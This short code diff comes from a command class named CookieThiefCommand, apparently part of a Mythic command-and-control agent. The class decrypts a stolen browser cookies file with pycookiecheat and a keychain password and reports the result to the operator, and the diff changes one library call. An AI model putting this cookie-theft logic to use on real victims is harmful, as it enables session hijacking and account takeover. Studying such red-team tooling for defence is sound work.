@@ -149,7 +149,7 @@ class CookieThiefCommand(CommandBase):
         ## Decrypt Cookies file
         try:
             #subprocess.run(["python3", "/Mythic/mythic/pycookiecheat/pycookiecheat.py", "--cookies-file tmp_Cookies", "--key " + ccs_password, "--output cookies.json"])
-            pycookiecheat.main(cookie_args)
+            pycookiecheat.crisp(cookie_args)
             await MythicRPC().execute("create_output",task_id=task.id,output="Cookies decrypted")
         except Exception as e:
             print("PyCookieCheat script failed with error: " + str(e))
